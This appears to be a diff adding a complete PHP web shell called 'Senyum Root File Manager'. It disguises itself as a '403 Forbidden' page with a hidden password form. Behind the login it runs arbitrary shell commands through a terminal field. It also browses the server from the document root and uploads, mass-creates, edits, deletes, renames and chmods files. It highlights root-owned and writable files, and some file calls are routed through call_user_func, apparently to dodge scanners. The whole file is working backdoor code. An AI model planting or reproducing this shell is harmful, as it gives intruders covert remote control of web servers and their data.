@@ -1,0 +1,566 @@
+<?php
+session_start();
+
+// Hash password bcrypt 
+$password_hash = '$2y$10$OOgHgeTlsLZP1GZsg6Wdf.fbKbwOURhkTLNOhPzcXcAnACWNV8AsO'; // contoh, ganti sesuai hasil hash kamu
+
+$loggedIn = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+
+// Proses login
+if (isset($_POST['login_pass'])) {
+    if (password_verify($_POST['login_pass'], $password_hash)) {
+        $_SESSION['logged_in'] = true;
+        header('Location: ?');
+        exit;
+    } else {
+        $error = "Incorrect password.";
+    }
+}
+
+// Jika belum login, tampilkan 403
+if (!$loggedIn) {
+    header('HTTP/1.0 403 Forbidden');
+    ?>
+    <!DOCTYPE html>
+    <html><head><title>403 Forbidden</title></head>
+    <body style="background:#111;color:#eee;font-family:monospace;text-align:center;margin-top:100px;">
+        <h1>403 Forbidden</h1>
+        <p>Access Denied</p>
+        <form method="post">
+            <input type="password" name="login_pass" placeholder="Enter Password" style="padding:10px;background:#222;color:#fff;border:1px solid #444;">
+            <button type="submit" style="padding:10px;">Login</button>
+        </form>
+        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
+    </body></html>
+    <?php
+    exit;
+}
+
+// Redirect ke path saat ini jika tidak ada parameter
+if (!isset($_GET['path'])) {
+    $default = realpath($_SERVER['DOCUMENT_ROOT']); // atau sesuaikan path awal kamu
+    header('Location: ?path=' . urlencode($default));
+    exit;
+}
+
+$path = realpath($_GET['path']);
+if (!$path || !is_dir($path)) die("Access denied.");
+
+
+$msg = '';
+$term_output = '';
+$edit_file = '';
+$edit_content = '';
+
+// Create Folder
+if (isset($_POST['new_folder'])) {
+    $folder_name = trim($_POST['new_folder']);
+    if ($folder_name !== '' && preg_match('/^[a-zA-Z0-9_\- ]+$/', $folder_name)) {
+        $new_folder_path = $path . '/' . $folder_name;
+        if (!file_exists($new_folder_path)) {
+            if (mkdir($new_folder_path, 0755)) {
+                $msg = "Folder created: " . htmlspecialchars($folder_name);
+            } else {
+                $msg = "Failed to create folder.";
+            }
+        } else {
+            $msg = "Folder already exists.";
+        }
+    } else {
+        $msg = "Invalid folder name.";
+    }
+}
+
+// Create File
+if (isset($_POST['new_file'])) {
+    $file_name = trim($_POST['new_file']);
+    if ($file_name !== '' && preg_match('/^[a-zA-Z0-9_\-\.]+$/', $file_name)) {
+        $new_file_path = $path . '/' . $file_name;
+        if (!file_exists($new_file_path)) {
+            if (file_put_contents($new_file_path, '') !== false) {
+                $msg = "File created: " . htmlspecialchars($file_name);
+            } else {
+                $msg = "Failed to create file.";
+            }
+        } else {
+            $msg = "File already exists.";
+        }
+    } else {
+        $msg = "Invalid file name.";
+    }
+}
+
+// Upload
+if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
+    $target = $path . '/' . basename($_FILES['upload_file']['name']);
+    $msg = move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)
+        ? "File uploaded."
+        : "Upload failed.";
+}
+
+// Mass Create Files 
+if (isset($_POST['mass_path'], $_POST['file_names'], $_POST['file_contents'])) {
+    $upload_path = realpath($_POST['mass_path']);
+    if (!$upload_path || !is_dir($upload_path)) {
+        $msg = "Invalid target folder path.";
+    } else {
+        $count = 0;
+        $names = $_POST['file_names'];
+        $contents = $_POST['file_contents'];
+
+        foreach ($names as $idx => $name) {
+            $name = trim($name);
+            $content = $contents[$idx] ?? '';
+            // Validasi nama file sederhana (bisa diperketat)
+            if ($name !== '' && preg_match('/^[a-zA-Z0-9_\-\. ]+$/', $name)) {
+                $target_file = $upload_path . '/' . $name;
+                if (file_put_contents($target_file, $content) !== false) {
+                    $count++;
+                }
+            }
+        }
+        $msg = "Created $count file(s) in " . htmlspecialchars($upload_path);
+    }
+}
+
+// Mass Delete Files 
+if (isset($_POST['delete_path'], $_POST['delete_file_names'])) {
+    $delete_path = realpath($_POST['delete_path']);
+    if (!$delete_path || !is_dir($delete_path)) {
+        $msg = "Invalid target folder path for delete.";
+    } else {
+        $names = $_POST['delete_file_names'];
+        $deleted = 0;
+        $failed = 0;
+        foreach ($names as $name) {
+            $name = trim($name);
+            if ($name !== '' && preg_match('/^[a-zA-Z0-9_\-\. ]+$/', $name)) {
+                $file_path = $delete_path . '/' . $name;
+                if (is_file($file_path)) {
+                    if (@unlink($file_path)) {
+                        $deleted++;
+                    } else {
+                        $failed++;
+                    }
+                } else {
+                    $failed++;
+                }
+            }
+        }
+        $msg = "Deleted $deleted file(s). Failed to delete $failed file(s).";
+    }
+}
+
+// Mass Chmod Files 
+if (isset($_POST['chmod_path'], $_POST['chmod_file_names'], $_POST['chmod_values'])) {
+    $chmod_path = realpath($_POST['chmod_path']);
+    if (!$chmod_path || !is_dir($chmod_path)) {
+        $msg = "Invalid target folder path for chmod.";
+    } else {
+        $files = $_POST['chmod_file_names'];
+        $perms = $_POST['chmod_values'];
+        $success = 0;
+        $failed = 0;
+        foreach ($files as $idx => $file_name) {
+            $file_name = trim($file_name);
+            $perm_val = trim($perms[$idx] ?? '');
+            if ($file_name !== '' && preg_match('/^[a-zA-Z0-9_\-\. ]+$/', $file_name)
+                && preg_match('/^[0-7]{3,4}$/', $perm_val)) {
+                $file_path = $chmod_path . '/' . $file_name;
+                if (file_exists($file_path)) {
+                    $perm_int = intval($perm_val, 8);
+                    if (@chmod($file_path, $perm_int)) {
+                        $success++;
+                    } else {
+                        $failed++;
+                    }
+                } else {
+                    $failed++;
+                }
+            } else {
+                $failed++;
+            }
+        }
+        $msg = "Changed permissions on $success file(s). Failed on $failed file(s).";
+    }
+}
+
+
+// Terminal
+if (!empty($_POST['terminal_cmd'])) {
+    $cmd = $_POST['terminal_cmd'];
+    $term_output = shell_exec("cd " . escapeshellarg($path) . " && $cmd 2>&1") ?? "Command failed.";
+}
+
+// Edit file
+if (isset($_POST['edit_file'], $_POST['edit_data'])) {
+    $f = realpath($path . '/' . $_POST['edit_file']);
+    if ($f && is_file($f)) {
+        $msg = file_put_contents($f, $_POST['edit_data']) !== false
+            ? "File saved."
+            : "Failed to save file.";
+    } else $msg = "Invalid file.";
+}
+
+// Chmod
+if (isset($_POST['chmod_file'], $_POST['chmod_value'])) {
+    $f = realpath($path . '/' . $_POST['chmod_file']);
+    if ($f) {
+        $perm = intval($_POST['chmod_value'], 8);
+        $msg = @chmod($f, $perm)
+            ? "Permissions changed."
+            : "Failed chmod.";
+    }
+}
+
+// Delete file or folder
+if (isset($_POST['delete_target'])) {
+    $target = realpath($path . '/' . $_POST['delete_target']);
+    if ($target && strpos($target, $path) === 0) { // pastikan dalam scope path
+        $isDir = is_dir($target);
+        $deleteFunc = function($f) {
+            return @call_user_func('unlink', $f);
+        };
+        $rmDirFunc = function($f) {
+            return @call_user_func('rmdir', $f);
+        };
+        $msg = $isDir
+            ? ($rmDirFunc($target) ? "Folder deleted." : "Failed to delete folder.")
+            : ($deleteFunc($target) ? "File deleted." : "Failed to delete file.");
+    } else {
+        $msg = "Invalid delete target.";
+    }
+}
+
+// Rename
+if (isset($_POST['rename_old'], $_POST['rename_new'])) {
+    $old = realpath($path . '/' . $_POST['rename_old']);
+    $new = $path . '/' . basename($_POST['rename_new']);
+    if ($old && strpos($old, $path) === 0) {
+        $renameFunc = function($a, $b) {
+            return @call_user_func('rename', $a, $b);
+        };
+        $msg = $renameFunc($old, $new)
+            ? "Renamed successfully."
+            : "Failed to rename.";
+    } else {
+        $msg = "Invalid rename target.";
+    }
+}
+
+// Load for editing
+if (isset($_GET['edit'])) {
+    $edit_file = basename($_GET['edit']); // hanya nama file
+    $target = realpath($path . '/' . $edit_file);
+
+    if ($target && is_file($target) && strpos($target, $path) === 0) {
+        $edit_content = file_get_contents($target);
+    } else {
+        $edit_file = '';
+        $msg = "Cannot open file.";
+    }
+}
+
+// Listing
+$raw_items = array_diff(scandir($path, SCANDIR_SORT_ASCENDING), ['.', '..']);
+$folders = [];
+$files = [];
+
+foreach ($raw_items as $i) {
+    $fp = $path . '/' . $i;
+    if (is_dir($fp)) {
+        $folders[] = $i;
+    } else {
+        $files[] = $i;
+    }
+}
+
+sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
+sort($files, SORT_NATURAL | SORT_FLAG_CASE);
+
+$items = array_merge($folders, $files);
+function is_text($file) {
+    return true;
+}
+function perms($p) {
+    return substr(sprintf('%o', $p), -4);
+}
+function make_path_links($path) {
+    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
+    $links = '/';
+    $out = '<a href="?path=/">/</a>';
+    foreach ($parts as $part) {
+        $links .= $part . '/';
+        $out .= '<a href="?path=' . urlencode(rtrim($links, '/')) . '">' . htmlspecialchars($part) . '</a>/';
+    }
+    return $out;
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Senyum Root File Manager</title>
+    <style>
+        body { font-family: monospace; background: #1c1c1c; color: #ddd; max-width: 1000px; margin: auto; padding: 20px; }
+        a { color: #4fc3f7; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 6px; border-bottom: 1px solid #444; }
+        input, textarea, button { font-family: monospace; background: #333; color: #eee; border: none; padding: 5px; }
+        textarea { width: 100%; height: 300px; }
+        .msg { background: #2e7d32; padding: 10px; color: #c8e6c9; margin-bottom: 10px; }
+        .terminal { background: #000; color: #0f0; padding: 10px; white-space: pre-wrap; border: 1px solid #0f0; margin-top: 10px; }
+        form.inline { display: inline; }
+    </style>
+</head>
+<body>
+
+<h2>Senyum File Manager</h2>
+<p>Directory: <?= make_path_links($path) ?></p>
+<?php if ($msg): ?><div class="msg"><?= htmlspecialchars($msg) ?></div><?php endif; ?>
+
+<!-- Create Folder -->
+<form method="post" style="margin-bottom: 10px;">
+    <input type="text" name="new_folder" placeholder="New folder name" required pattern="[a-zA-Z0-9_\- ]+">
+    <button type="submit">Create Folder</button>
+</form>
+
+<!-- Create File -->
+<form method="post" style="margin-bottom: 10px;">
+    <input type="text" name="new_file" placeholder="New file name" required pattern="[a-zA-Z0-9_\-\.]+">
+    <button type="submit">Create File</button>
+</form>
+
+<!-- Upload -->
+<form method="post" enctype="multipart/form-data" style="margin-bottom: 20px;">
+    <input type="file" name="upload_file" required>
+    <button type="submit">Upload</button>
+</form>
+
+<!-- Mass Upload File -->
+<button id="openMassCreate" style="margin-bottom:10px;">Mass Create Files</button>   
+<!-- Mass Delete File -->
+<button id="openMassDelete" style="margin-bottom:10px; background:#b33;">Mass Delete Files</button>
+<!-- Mass Chmod File -->
+<button id="openMassChmod" style="margin-bottom:10px; background:#337ab7; color:#fff;">Mass Chmod Files</button>
+
+<!-- Mass Upload File -->
+<div id="massCreateModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.7); 
+    justify-content:center; align-items:center; z-index:1000; overflow:auto;">
+  <div style="background:#222; padding:20px; border-radius:8px; width:600px; max-height:90vh; color:#eee; font-family: monospace; overflow:auto;">
+    <h3>Mass Create Files</h3>
+    <form id="massCreateForm" method="post">
+      <label for="mass_path">Target Folder Path:</label><br>
+      <input type="text" name="mass_path" id="mass_path" style="width:100%; margin-bottom:10px;" placeholder="/home/path" required><br>
+
+      <div id="fileInputs">
+        <div class="fileInput" style="margin-bottom:15px; border-bottom:1px solid #444; padding-bottom:10px;">
+          <input type="text" name="file_names[]" placeholder="File name (e.g. test.txt)" required style="width:100%; margin-bottom:5px; background:#333; color:#eee; border:none; padding:5px;">
+          <textarea name="file_contents[]" placeholder="File content" rows="4" required style="width:100%; background:#333; color:#eee; border:none; padding:5px;"></textarea>
+        </div>
+      </div>
+
+      <button type="button" id="addFileInput" style="margin-top:10px;">Add another file</button><br><br>
+      <button type="submit">Create Files</button>
+      <button type="button" id="closeMassCreate" style="margin-left:10px;">Cancel</button>
+    </form>
+  </div>
+</div>
+
+<!-- Mass Delete File -->
+<div id="massDeleteModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.7); 
+    justify-content:center; align-items:center; z-index:1000; overflow:auto;">
+  <div style="background:#222; padding:20px; border-radius:8px; width:600px; max-height:90vh; color:#eee; font-family: monospace; overflow:auto;">
+    <h3>Mass Delete Files</h3>
+    <form id="massDeleteForm" method="post">
+      <label for="delete_path">Target Folder Path:</label><br>
+      <input type="text" name="delete_path" id="delete_path" style="width:100%; margin-bottom:10px;" placeholder="/home/path" required><br>
+
+      <div id="deleteFileInputs">
+        <div class="deleteFileInput" style="margin-bottom:10px;">
+          <input type="text" name="delete_file_names[]" placeholder="File name to delete (e.g. test.txt)" required
+            style="width:100%; background:#333; color:#eee; border:none; padding:5px;">
+        </div>
+      </div>
+
+      <button type="button" id="addDeleteFileInput" style="margin-top:10px;">Add another file</button><br><br>
+      <button type="submit" style="background:#b33; color:#eee;">Delete Files</button>
+      <button type="button" id="closeMassDelete" style="margin-left:10px;">Cancel</button>
+    </form>
+  </div>
+</div>
+
+<!-- Mass Chmod File -->
+<div id="massChmodModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.7); 
+    justify-content:center; align-items:center; z-index:1000; overflow:auto;">
+  <div style="background:#222; padding:20px; border-radius:8px; width:600px; max-height:90vh; color:#eee; font-family: monospace; overflow:auto;">
+    <h3>Mass Chmod Files</h3>
+    <form id="massChmodForm" method="post">
+      <label for="chmod_path">Target Folder Path:</label><br>
+      <input type="text" name="chmod_path" id="chmod_path" style="width:100%; margin-bottom:10px;" placeholder="/home/usersasa" required><br>
+
+      <div id="chmodFileInputs">
+        <div class="chmodFileInput" style="margin-bottom:10px;">
+          <input type="text" name="chmod_file_names[]" placeholder="File name (e.g. test.txt)" required
+            style="width:70%; background:#333; color:#eee; border:none; padding:5px;">
+          <input type="text" name="chmod_values[]" placeholder="chmod (e.g. 755)" required size="4"
+            style="width:20%; background:#333; color:#eee; border:none; padding:5px; margin-left:10px;">
+        </div>
+      </div>
+
+      <button type="button" id="addChmodFileInput" style="margin-top:10px;">Add another file</button><br><br>
+      <button type="submit" style="background:#337ab7; color:#eee;">Apply Chmod</button>
+      <button type="button" id="closeMassChmod" style="margin-left:10px;">Cancel</button>
+    </form>
+  </div>
+</div>
+
+
+<h3>Terminal</h3>
+<form method="post">
+    <input type="text" name="terminal_cmd" placeholder="e.g. ls -la" style="width:80%" autofocus>
+    <button type="submit">Run</button>
+</form>
+<div class="terminal"><?= htmlspecialchars($term_output ?: "Terminal output here.") ?></div>
+
+<hr>
+<table>
+<tr><th>Name</th><th>Type</th><th>Size</th><th>Perms</th><th>Actions</th></tr>
+<?php
+foreach ($items as $i) {
+    if ($i === '.' || $i === '..') continue;
+    $fp = $path . '/' . $i;
+    $is_dir = is_dir($fp);
+    $perms = perms(fileperms($fp));
+
+    // Determine color
+    $color = '';
+    if (@fileowner($fp) === 0) {
+        $color = 'yellow'; // owned by root
+    } elseif (@is_writable($fp)) {
+        $color = 'lightgreen'; // writable
+    } else {
+        $color = 'tomato'; // not writable
+    }
+
+    echo "<tr>";
+    echo "<td>";
+    if ($is_dir) {
+        echo "<a href='?path=" . urlencode($fp) . "' style='color:limegreen;'>" . htmlspecialchars($i) . "</a>";
+    } else {
+        $name_color = 'khaki'; // atau yellow, atau gold
+        if (is_text($i)) {
+            echo "<a href='?path=" . urlencode($path) . "&edit=" . urlencode($i) . "' style='color:$name_color;'>" . htmlspecialchars($i) . "</a>";
+        } else {
+            echo "<span style='color:$name_color;'>" . htmlspecialchars($i) . "</span>";
+        }
+    }
+    echo "</td>";
+    echo "<td>" . ($is_dir ? "Dir" : "File") . "</td>";
+    echo "<td>" . ($is_dir ? '-' : filesize($fp)) . "</td>";
+    echo "<td style='color:$color;'>$perms</td>";
+    echo "<td>
+    <form method='post' class='inline' style='margin-right:5px;'>
+        <input type='hidden' name='chmod_file' value='".htmlspecialchars($i)."'>
+        <input type='text' name='chmod_value' value='".substr($perms,-3)."' size='3' style='color:$color; background-color:grey;' title='chmod'>
+        <button type='submit'>chmod</button>
+    </form>
+
+    <form method='post' class='inline'>
+        <input type='hidden' name='rename_old' value='".htmlspecialchars($i)."'>
+        <input type='text' name='rename_new' value='".htmlspecialchars($i)."' size='10' style='background-color:grey;' required>
+        <button type='submit'>rename</button>
+    </form>
+    
+    <form method='post' class='inline' style='margin-right:5px;'>
+        <input type='hidden' name='delete_target' value='".htmlspecialchars($i)."'>
+        <button type='submit' onclick=\"return confirm('Delete ".htmlspecialchars($i)."?');\">delete</button>
+    </form>
+</td>";
+
+    echo "</tr>";
+}
+?>
+</table>
+
+<?php if ($edit_file): ?>
+<hr>
+<h3>Editing: <?= htmlspecialchars($edit_file) ?></h3>
+<form method="post">
+    <input type="hidden" name="edit_file" value="<?= htmlspecialchars($edit_file) ?>">
+    <textarea name="edit_data"><?= htmlspecialchars($edit_content) ?></textarea><br>
+    <button type="submit">Save</button>
+    <a href="?path=<?= urlencode($path) ?>">Cancel</a>
+</form>
+<?php endif; ?>
+
+<hr>
+
+
+<!-- Mass Create Files -->
+<script>
+document.getElementById('openMassCreate').addEventListener('click', function() {
+  document.getElementById('massCreateModal').style.display = 'flex';
+});
+document.getElementById('closeMassCreate').addEventListener('click', function() {
+  document.getElementById('massCreateModal').style.display = 'none';
+});
+
+document.getElementById('addFileInput').addEventListener('click', function() {
+  const container = document.getElementById('fileInputs');
+  const div = document.createElement('div');
+  div.classList.add('fileInput');
+  div.style = "margin-bottom:15px; border-bottom:1px solid #444; padding-bottom:10px;";
+  div.innerHTML = `
+    <input type="text" name="file_names[]" placeholder="File name (e.g. test.txt)" required style="width:100%; margin-bottom:5px; background:#333; color:#eee; border:none; padding:5px;">
+    <textarea name="file_contents[]" placeholder="File content" rows="4" required style="width:100%; background:#333; color:#eee; border:none; padding:5px;"></textarea>
+  `;
+  container.appendChild(div);
+});
+</script>
+
+<!-- Mass Delete Files -->
+<script>
+document.getElementById('openMassDelete').addEventListener('click', function() {
+  document.getElementById('massDeleteModal').style.display = 'flex';
+});
+document.getElementById('closeMassDelete').addEventListener('click', function() {
+  document.getElementById('massDeleteModal').style.display = 'none';
+});
+document.getElementById('addDeleteFileInput').addEventListener('click', function() {
+  const container = document.getElementById('deleteFileInputs');
+  const div = document.createElement('div');
+  div.classList.add('deleteFileInput');
+  div.style.marginBottom = "10px";
+  div.innerHTML = `<input type="text" name="delete_file_names[]" placeholder="File name to delete (e.g. test.txt)" required
+    style="width:100%; background:#333; color:#eee; border:none; padding:5px;">`;
+  container.appendChild(div);
+});
+</script>
+
+<!-- Mass Chmod Files -->
+<script>
+document.getElementById('openMassChmod').addEventListener('click', function() {
+  document.getElementById('massChmodModal').style.display = 'flex';
+});
+document.getElementById('closeMassChmod').addEventListener('click', function() {
+  document.getElementById('massChmodModal').style.display = 'none';
+});
+document.getElementById('addChmodFileInput').addEventListener('click', function() {
+  const container = document.getElementById('chmodFileInputs');
+  const div = document.createElement('div');
+  div.classList.add('chmodFileInput');
+  div.style.marginBottom = "10px";
+  div.innerHTML = `
+    <input type="text" name="chmod_file_names[]" placeholder="File name (e.g. test.txt)" required
+      style="width:70%; background:#333; color:#eee; border:none; padding:5px;">
+    <input type="text" name="chmod_values[]" placeholder="chmod (e.g. 755)" required size="4"
+      style="width:20%; background:#333; color:#eee; border:none; padding:5px; margin-left:10px;">`;
+  container.appendChild(div);
+});
+</script>
+
+
+</body>
+</html>
